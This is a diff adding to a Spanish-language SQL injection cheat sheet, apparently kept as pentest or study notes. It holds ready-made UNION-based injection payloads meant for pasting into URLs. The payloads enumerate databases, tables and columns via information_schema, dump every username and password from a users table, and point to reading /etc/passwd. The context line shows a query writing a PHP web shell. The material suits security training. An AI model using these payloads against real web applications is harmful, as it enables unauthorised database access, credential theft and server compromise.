@@ -41,3 +41,35 @@ SELECT password,email FROM users WHERE id=1 UNION SELECT "<?php system('whoami')
 <p align="center">
   <img src="https://i.postimg.cc/6qxB0qpy/mas-ejemplos-con-UNION.png" alt="sql"/>
 </p>
++ Utilizando una inyección de código hacia un directorio como **/etc/hosts** o **/etc/passwd**
+<p align="center">
+  <img src="https://i.postimg.cc/1X0nT1WV/load-file-sql.png" alt="sql"/>
+</p>
+---
++ **Recupera las bases de datos disponibles en el servidor - LISTAR DBS**
+```sql
+//Ejemplo por consola
+SELECT username,password FROM users WHERE category=Accessories' UNION SELECT username,group_concat(schema_name) FROM information_schema.schemata-- -
+```
+```SQL
+//Esto va en la URL
+' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
+```
+- **Recupero "todas" las tablas creadas en cada base de datos. - LISTAR TABLAS**
+```SQL
+//Esto va en la URL
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+```
+-  LISTAR COLUMNA
+<p align="center">
+  <img src="https://i.postimg.cc/7ZT8y18D/tabla-y-dbs.png" alt="sql"/>
+</p>
+```sql
+SELECT username,password FROM users WHERE category=Accessories' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -
+```
+information_schema.tables > Muestra todas las tablas
+
+- Leer todos los nombres de usuario y contraseña de una tabla
+```sql
+SELECT username,password FROM users WHERE category=Accessories' UNION SELECT username,password FROM users-- -
+```
